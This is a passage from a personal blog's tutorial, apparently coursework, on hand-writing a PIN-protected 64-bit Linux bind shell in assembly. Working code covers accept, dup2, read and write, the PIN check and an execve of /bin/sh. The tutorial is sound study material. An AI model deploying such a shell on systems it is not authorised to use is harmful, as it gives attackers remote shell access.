</code></pre></div></div><h4 id="accept-and-close-syscall"><b>accept() and close() syscall</b></h4><p>In order to accept an incoming TCP connection we use the <code class="highlighter-rouge">accept()</code> syscall which has 3 arguments. We already have sockfd previously set to RDI so let’s see the other 2 - <code class="highlighter-rouge">struct sockaddr *addr</code>, <code class="highlighter-rouge">socklen_t</code>, and <code class="highlighter-rouge">int flags</code>. The argument addr is a pointer to a sockaddr structure which we talked about earlier and know is 16 bytes in length. This is the reason we need to allocate 16 bytes on the stack as you see in the assembly code example below. Having allocated the space on the stack, we can also appoint the current RSP to RSI as it is pointing to the start of that struct. Next we can also use stack for storing the struct length in bytes, which we then read to RDX as 3rd argument value.<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">accept</span><span class="p">:</span>
<span class="p">;</span><span class="k">new</span> <span class="o">=</span> <span class="kr">int</span> <span class="nx">accept</span><span class="p">(</span><span class="kr">int</span> <span class="nx">sockfd</span><span class="p">,</span> <span class="nx">struct</span> <span class="nx">sockaddr</span> <span class="o">*</span><span class="nx">addr</span><span class="p">,</span> <span class="nx">socklen_t</span> <span class="o">*</span><span class="nx">addrlen</span><span class="p">);</span>

	<span class="nx">sub</span> <span class="nx">rsp</span><span class="p">,</span> <span class="mi">16</span>
	<span class="nx">mov</span> <span class="nx">rsi</span><span class="p">,</span> <span class="nx">rsp</span>
	<span class="nx">mov</span> <span class="kr">byte</span> <span class="p">[</span><span class="nx">rsp</span><span class="o">-</span><span class="mi">1</span><span class="p">],</span> <span class="mi">16</span>
	<span class="nx">sub</span> <span class="nx">rsp</span><span class="p">,</span> <span class="mi">1</span>
	<span class="nx">mov</span> <span class="nx">rdx</span><span class="p">,</span> <span class="nx">rsp</span>

	<span class="nx">mov</span> <span class="nx">al</span><span class="p">,</span> <span class="mi">43</span>
	<span class="nx">syscall</span>

	<span class="nx">mov</span> <span class="nx">r9</span><span class="p">,</span> <span class="nx">rax</span> 	     <span class="p">;</span><span class="nx">lets</span> <span class="nx">keep</span> <span class="nx">the</span> <span class="k">new</span> <span class="nx">fd</span> <span class="k">in</span> <span class="nx">r9</span> <span class="k">for</span> <span class="nx">later</span> <span class="nx">use</span>
</code></pre></div></div><p>Once <code class="highlighter-rouge">accept()</code> returns successfully we receive a new file descriptor for the accepted socket (saved in <code class="highlighter-rouge">r9</code>) and can close the old one by using the <code class="highlighter-rouge">close()</code> syscall. It takes only 1 parameter which is the old file descriptor <code class="highlighter-rouge">sockfd</code> (already in RDI). So we can just set RAX to 3 which is the respective syscall number for <code class="highlighter-rouge">close()</code>.<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">close</span><span class="p">:</span>
	<span class="nx">xor</span> <span class="nx">rax</span><span class="p">,</span> <span class="nx">rax</span>
	<span class="nx">add</span> <span class="nx">rax</span><span class="p">,</span> <span class="mh">0x3</span>
	<span class="nx">syscall</span>
</code></pre></div></div><h4 id="dup2-syscall"><b>dup2() syscall</b></h4><p>Once we accepted an incoming connection successfully, we received a new file descriptor. At this point we need to think ahead a bit. What we want our program to do is to write a message for the connected client to enter a PIN code and then receive the PIN code from the client as input. For this we can use <code class="highlighter-rouge">dup2()</code> to tie the standard file descriptors (0-stdin, 1-stdout, 2-stderr) to the new socket so we can do the reading and writing easily. <code class="highlighter-rouge">dup2()</code> takes 2 arguments, 1st the current file descriptor and 2nd the new file descriptor which creates a copy of the old one.<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">duplicate_sockets</span><span class="p">:</span>
	<span class="p">;</span><span class="nx">dup</span><span class="p">(</span><span class="k">new</span><span class="p">,</span><span class="nx">old</span><span class="p">)</span>

	<span class="nx">mov</span> <span class="nx">rdi</span><span class="p">,</span> <span class="nx">r9</span>		<span class="p">;</span><span class="nx">r9</span> <span class="nx">holds</span> <span class="nx">the</span> <span class="nx">fd</span> <span class="nx">we</span> <span class="nx">received</span> <span class="k">from</span> <span class="nx">accept</span><span class="p">()</span> <span class="k">in</span> <span class="k">return</span>
	<span class="nx">xor</span> <span class="nx">rsi</span><span class="p">,</span> <span class="nx">rsi</span>    <span class="p">;</span><span class="mi">0</span><span class="o">-</span><span class="nx">stdin</span>
	<span class="nx">xor</span> <span class="nx">rax</span><span class="p">,</span> <span class="nx">rax</span>
	<span class="nx">mov</span> <span class="nx">al</span><span class="p">,</span> <span class="mi">33</span>
	<span class="nx">syscall</span>

	<span class="nx">mov</span> <span class="nx">sil</span><span class="p">,</span> <span class="mi">1</span>      <span class="p">;</span><span class="mi">1</span><span class="o">-</span><span class="nx">stdout</span>
	<span class="nx">mov</span> <span class="nx">al</span><span class="p">,</span> <span class="mi">33</span>
	<span class="nx">syscall</span>

	<span class="nx">mov</span> <span class="nx">sil</span><span class="p">,</span> <span class="mi">2</span>      <span class="p">;</span><span class="mi">2</span><span class="o">-</span><span class="nx">stderr</span>
	<span class="nx">mov</span> <span class="nx">al</span><span class="p">,</span> <span class="mi">33</span>
	<span class="nx">syscall</span>
</code></pre></div></div><h4 id="correct-pin-code-before-executing-binsh"><b>Correct PIN code before executing <code class="highlighter-rouge">/bin/sh</code></b></h4><p>Now we have reached to the point where we have successfully established a connection between the server and the client. Next we will focus on the <code class="highlighter-rouge">read()</code>, <code class="highlighter-rouge">write()</code> and <code class="highlighter-rouge">execve()</code> syscalls + the comparison of user usbmitted PIN with our secret PIN, to complete the assignment.<p>
  <hy-img root-margin="512px"  src="/assets/img/SLAE/client_server.png" alt="hello" >
    <noscript><img data-ignore  src="/assets/img/SLAE/client_server.png" alt="hello" /></noscript>
    <span class="loading" slot="loading" hidden>
      <span class="icon-cog"></span>
    </span>
  </hy-img><h4 id="write-and-read-syscalls"><b>write() and read() syscalls</b></h4><p>Write() syscall takes 3 arguments: <b>fd</b> which is the new file descriptor we received from the accept() syscall, a <b>buf</b> to hold to contents users writes and the <b>count</b> to represent the number of bytes to be written.<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">ssize_t</span> <span class="nx">write</span><span class="p">(</span><span class="kr">int</span> <span class="nx">fd</span><span class="p">,</span> <span class="kd">const</span> <span class="k">void</span> <span class="o">*</span><span class="nx">buf</span><span class="p">,</span> <span class="nx">size_t</span> <span class="nx">count</span><span class="p">);</span>
</code></pre></div></div><p>So in assembly we will use RDX register to specify that we want to write total of 6 bytes of data. Next on we zero out the contents of RSI registry and move the value <code class="highlighter-rouge">0x3a4e4950</code> to it. This hex value presents a string “PIN:”. To get the exact form in hex, one could use a oneliner in python <code class="highlighter-rouge">python -c "import binascii; inhex=binascii.hexlify('PIN:'[::-1]); print inhex"</code>, which also takes into account the little-endian format. After moving it to RSI, we push it on the stack so we can have the address on which we have stored the string in RSI instead of the value itself as we are dealing with a pointer.<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">write</span><span class="p">:</span>

	<span class="nx">xor</span> <span class="nx">rdx</span><span class="p">,</span> <span class="nx">rdx</span>
	<span class="nx">add</span> <span class="nx">rdx</span><span class="p">,</span> <span class="mh">0x6</span>

	<span class="nx">xor</span> <span class="nx">rsi</span><span class="p">,</span> <span class="nx">rsi</span>
	<span class="nx">push</span> <span class="nx">rsi</span>
	<span class="nx">mov</span> <span class="nx">rsi</span><span class="p">,</span> <span class="mh">0x3a4e4950</span>
	<span class="nx">push</span> <span class="nx">rsi</span>
	<span class="nx">mov</span> <span class="nx">rsi</span><span class="p">,</span> <span class="nx">rsp</span>

	<span class="nx">mov</span> <span class="nx">rax</span><span class="p">,</span> <span class="mh">0x1</span>
	<span class="nx">syscall</span>
</code></pre></div></div><p>For the <code class="highlighter-rouge">read()</code> syscall we again have the correct fd in RDI already. This time we will be using RSI to hold the address value of the buffer where we will store the value submitted by the client. The number of bytes to be read is specified in RDX. As we are expecting a 4 digit PIN we will need to allocate a 4 byte long buffer (<code class="highlighter-rouge">sub rsp,4</code>) and adjust the stack pointer to point to the beginning of the buffer (<code class="highlighter-rouge">mov rsi, rsp</code>). Next we specify with <code class="highlighter-rouge">add rdx, 0x4</code> that we want 4 bytes of data to be read and not more.<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">;</span><span class="nl">read</span><span class="p">:</span>
	<span class="p">;</span><span class="nx">ssize_t</span> <span class="nx">read</span><span class="p">(</span><span class="kr">int</span> <span class="nx">fd</span><span class="p">,</span> <span class="k">void</span> <span class="o">*</span><span class="nx">buf</span><span class="p">,</span> <span class="nx">size_t</span> <span class="nx">count</span><span class="p">);</span>
	<span class="nx">sub</span> <span class="nx">rsp</span><span class="p">,</span> <span class="mi">4</span>
	<span class="nx">mov</span> <span class="nx">rsi</span><span class="p">,</span> <span class="nx">rsp</span>

	<span class="nx">xor</span> <span class="nx">rdx</span><span class="p">,</span> <span class="nx">rdx</span>
	<span class="nx">add</span> <span class="nx">rdx</span><span class="p">,</span> <span class="mh">0x4</span>

	<span class="nx">xor</span> <span class="nx">rax</span><span class="p">,</span> <span class="nx">rax</span>
	<span class="nx">syscall</span>

</code></pre></div></div><h4 id="desicion-making-time"><b>Desicion making time</b></h4><p>So we have told the client that we expect a PIN code, and we have received and read 4 bytes of data as PIN code. How do we decide if we will execute the <code class="highlighter-rouge">/bin/sh</code> or not? At this point we know that user input sits on the top of our stack at where RSP points to, so what we can do is check byte by byte whether these bytes correspond to what we are expecting them to. That is what’s happening at each <code class="highlighter-rouge">mov bl, byte [rsp+...]</code>. We take 1 byte of data, compare it with the hex value. If they are equal we continue and take the next byte, same comparison follows. If, however, the 2 bytes do not equal we immediately jump the the exit and end the program.<p>As we are doing the last, 4th comparison and the bytes are equal (we have correct PIN), the jump will be made to <code class="highlighter-rouge">execve()</code> instead of <code class="highlighter-rouge">exit()</code>. Let’s see how do we implement the <code class="highlighter-rouge">execve()</code> syscall in order to have shell back.<p>
  <hy-img root-margin="512px"  src="/assets/img/SLAE/desicion.png" alt="desicion" >
    <noscript><img data-ignore  src="/assets/img/SLAE/desicion.png" alt="desicion" /></noscript>
    <span class="loading" slot="loading" hidden>
      <span class="icon-cog"></span>
    </span>
  </hy-img><div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">cmpinput</span><span class="p">:</span>
	<span class="nx">xor</span> <span class="nx">rbx</span><span class="p">,</span> <span class="nx">rbx</span>
	<span class="nx">mov</span> <span class="nx">bl</span><span class="p">,</span> <span class="kr">byte</span> <span class="p">[</span><span class="nx">rsp</span><span class="p">]</span>
	<span class="nx">xor</span> <span class="nx">rcx</span><span class="p">,</span> <span class="nx">rcx</span>
	<span class="nx">mov</span> <span class="nx">rcx</span><span class="p">,</span> <span class="mh">0x31</span>
	<span class="nx">cmp</span> <span class="nx">rbx</span><span class="p">,</span> <span class="nx">rcx</span>
	<span class="nx">jne</span> <span class="nx">exit</span>

	<span class="nx">mov</span> <span class="nx">bl</span><span class="p">,</span> <span class="kr">byte</span> <span class="p">[</span><span class="nx">rsp</span><span class="o">+</span><span class="mi">1</span><span class="p">]</span>
	<span class="nx">mov</span> <span class="nx">rcx</span><span class="p">,</span> <span class="mh">0x32</span>
	<span class="nx">cmp</span> <span class="nx">rbx</span><span class="p">,</span> <span class="nx">rcx</span>
	<span class="nx">jne</span> <span class="nx">exit</span>

	<span class="nx">mov</span> <span class="nx">bl</span><span class="p">,</span> <span class="kr">byte</span> <span class="p">[</span><span class="nx">rsp</span><span class="o">+</span><span class="mi">2</span><span class="p">]</span>
	<span class="nx">mov</span> <span class="nx">rcx</span><span class="p">,</span> <span class="mh">0x33</span>
        <span class="nx">cmp</span> <span class="nx">rbx</span><span class="p">,</span> <span class="nx">rcx</span>
        <span class="nx">jne</span> <span class="nx">exit</span>

	<span class="nx">mov</span> <span class="nx">bl</span><span class="p">,</span> <span class="kr">byte</span> <span class="p">[</span><span class="nx">rsp</span><span class="o">+</span><span class="mi">3</span><span class="p">]</span>
	<span class="nx">mov</span> <span class="nx">rcx</span><span class="p">,</span> <span class="mh">0x34</span>
        <span class="nx">cmp</span> <span class="nx">rbx</span><span class="p">,</span> <span class="nx">rcx</span>
        <span class="nx">je</span> <span class="nx">execve</span>

<span class="nx">exit</span><span class="p">:</span>						<span class="p">;</span> <span class="nx">jump</span> <span class="nx">here</span> <span class="k">if</span> <span class="nx">bytes</span> <span class="k">do</span> <span class="nx">not</span> <span class="nx">match</span>
        <span class="nx">xor</span> <span class="nx">rdi</span><span class="p">,</span> <span class="nx">rdi</span>
        <span class="nx">xor</span> <span class="nx">rax</span><span class="p">,</span> <span class="nx">rax</span>
        <span class="nx">add</span> <span class="nx">rax</span><span class="p">,</span> <span class="mi">60</span>
        <span class="nx">syscall</span>

</code></pre></div></div><h4 id="finale---execve"><b>Finale - execve()</b></h4><p>Execve() takes 3 arguments: the file we want to execute which for us is the <code class="highlighter-rouge">/bin/sh</code>, as we it is a pointer <code class="highlighter-rouge">const char *filename</code> we need RDI to contain the address on which we have stored the program name. This is the reason why we first move the string in hex to RBX, push on the top of the stack and then move the address to RDI.<p>Next we need to get the address of an array of string constants <code class="highlighter-rouge">{"/bin/sh", NULL};</code> to RSI. For that we can just push the address we have at RDI to the top of the stack and move that stack address to RSI.<p>Third, we do not want to pass any environment variables, so we can make the 3rd argument just 0. So to finish it up, let’s check the <code class="highlighter-rouge">execve()</code> syscall number via <code class="highlighter-rouge">ausyscall execve</code>, read it to RAX and have a go on the last syscall for this task.<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">execve</span><span class="p">:</span>
	<span class="p">;</span><span class="kr">int</span> <span class="nx">execve</span><span class="p">(</span><span class="kd">const</span> <span class="kr">char</span> <span class="o">*</span><span class="nx">filename</span><span class="p">,</span> <span class="kr">char</span> <span class="o">*</span><span class="kd">const</span> <span class="nx">argv</span><span class="p">[],</span> <span class="kr">char</span> <span class="o">*</span><span class="kd">const</span> <span class="nx">envp</span><span class="p">[]);</span>
	<span class="nx">xor</span> <span class="nx">rdi</span><span class="p">,</span> <span class="nx">rdi</span>
	<span class="nx">xor</span> <span class="nx">rax</span><span class="p">,</span><span class="nx">rax</span>
	<span class="nx">push</span> <span class="nx">rax</span>

	<span class="nx">mov</span> <span class="nx">rbx</span><span class="p">,</span> <span class="mh">0x68732f6e69622f</span>
	<span class="nx">push</span> <span class="nx">rbx</span>
	<span class="nx">mov</span> <span class="nx">rdi</span><span class="p">,</span> <span class="nx">rsp</span>

	<span class="nx">push</span> <span class="nx">rax</span>
	<span class="nx">mov</span> <span class="nx">rdx</span><span class="p">,</span> <span class="nx">rsp</span>

	<span class="nx">push</span> <span class="nx">rdi</span>
	<span class="nx">mov</span> <span class="nx">rsi</span><span class="p">,</span> <span class="nx">rsp</span>

	<span class="nx">add</span> <span class="nx">rax</span><span class="p">,</span> <span class="mi">59</span>
	<span class="nx">syscall</span>
</code></pre></div></div><hr /><ul><li>Full assembly code can be found at:<br /> <a href="https://github.com/silviavali/SLAE/blob/master/task1/bindshell.nasm">https://github.com/silviavali/SLAE/blob/master/task1/bindshell.nasm</a><li>Full C code:<br /> <a href="https://github.com/silviavali/SLAE/blob/master/task1/bindshell.c">https://github.com/silviavali/SLAE/blob/master/task1/bindshell.c</a></ul></article><hr class="dingbat related" /><aside class="about related mt4 mb4" role="complementary"><div class="author mt4"> <hy-img src="https://placehold.it/128x128" class="avatar" alt="Silvia Väli" srcset="https://placehold.it/128x128 1x,https://placehold.it/256x256 2x" root-margin="512px" > <noscript><img data-ignore src="https://placehold.it/128x128" class="avatar" alt="Silvia Väli" srcset="https://placehold.it/128x128 1x,https://placehold.it/256x256 2x" /></noscript> <span class="loading" slot="loading" hidden> <span class="icon-cog"></span> </span> </hy-img><h2 class="page-title hr"> About</h2><p>My name is Silvia. This blog just contains various things that interest me, but probably relatively more assembly stuff. I count myself quite new to the ITsec community as I am almost 2 years in. If you wonder where I am from - Estonia.<div class="sidebar-social"> <span class="sr-only">Social:</span><ul><li> <a href="https://twitter.com/silviavaliSV" title="Twitter" class="no-mark-external"> <span class="icon-twitter"></span> <span class="sr-only">Twitter</span> </a><li> <a href="https://github.com/silviavali" title="GitHub" class="no-mark-external"> <span class="icon-github"></span> <span class="sr-only">GitHub</span> </a></ul></div></div></aside><aside class="related mb4" role="complementary"><h2 class="hr">Related Posts</h2><ul class="related-posts"><li> <a href="/blog/2019-02-25-blog-SLAE4/" class="h4 flip-title"> <span>Writing a 64-bit custom encoder</span> </a> <time class="heading faded fine" datetime="2019-02-25T00:00:00+02:00">25 Feb 2019</time><li> <a href="/blog/2019-02-25-blog-SLAE3/" class="h4 flip-title"> <span>Egghunter (64-bit Linux) using access() syscall</span> </a> <time class="heading faded fine" datetime="2019-02-25T00:00:00+02:00">25 Feb 2019</time><li> <a href="/blog/2019-01-25-blog-SLAE2/" class="h4 flip-title"> <span>64-bit reverse shell with passphrase protection</span> </a> <time class="heading faded fine" datetime="2019-01-25T00:00:00+02:00">25 Jan 2019</time></ul></aside><footer role="contentinfo"><hr/><p><small class="copyright">© 2019. All rights reserved. </small><p><small>Powered by <a class="external" href="https://hydejack.com/">Hydejack</a> v<span id="_version">8.1.1</span></small><hr class="sr-only"/></footer></main><hy-drawer class="" align="left" threshold="10" touch-events prevent-default ><header id="_sidebar" class="sidebar" role="banner"><div class="sidebar-bg sidebar-overlay" style="background-color:rgb(25,55,71);background-image:url(/assets/img/sidebar-bg.jpg)"></div><div class="sidebar-sticky"><div class="sidebar-about"> <a class="no-hover" href="/" tabindex="-1"> <img src="/assets/img/profile.jpg" class="avatar" alt="Silvia's blog" data-ignore /> </a><h2 class="h1"><a href="/">Silvia's blog</a></h2><p class=""> Random notes or stuff I am curious about.</div><nav class="sidebar-nav heading" role="navigation"> <span class="sr-only">Navigation:</span><ul><li> <a id="_navigation" href="/blog/" class="sidebar-nav-item active" > Blog </a><li> <a href="/about/" class="sidebar-nav-item" > About </a></ul></nav><div class="sidebar-social"> <span class="sr-only">Social:</span><ul><li> <a href="https://twitter.com/silviavaliSV" title="Twitter" class="no-mark-external"> <span class="icon-twitter"></span> <span class="sr-only">Twitter</span> </a><li> <a href="https://github.com/silviavali" title="GitHub" class="no-mark-external"> <span class="icon-github"></span> <span class="sr-only">GitHub</span> </a></ul></div></div></header></hy-drawer><hr class="sr-only" hidden /> </hy-push-state> <!--[if !IE]><!----> <script>loadJSDeferred(document.getElementById('_hrefJS').href);</script> <!--<![endif]--> <script> if ('serviceWorker' in navigator) { navigator.serviceWorker.getRegistration() .then(r => r.unregister()) .catch(() => {}); } </script><h2 class="sr-only" hidden>Templates (for web app):</h2><template id="_animation-template" hidden><div class="animation-main fixed-top"><div class="content"><div class="page"></div></div></div></template> <template id="_loading-template" hidden><div class="loading nav-btn fr"> <span class="sr-only">Loading…</span> <span class="icon-cog"></span></div></template> <template id="_error-template" hidden><div class="page"><h1 class="page-title">Error</h1><p class="lead"> Sorry, an error occurred while loading <a class="this-link" href=""></a>.</div></template> <template id="_back-template" hidden> <a id="_back" class="back nav-btn fl no-hover"> <span class="sr-only">Back</span> <span class="icon-arrow-left2"></span> </a> </template> <template id="_permalink-template" hidden> <a href="#" class="permalink"> <span class="sr-only">Permalink</span> <span class="icon-link"></span> </a> </template></html>
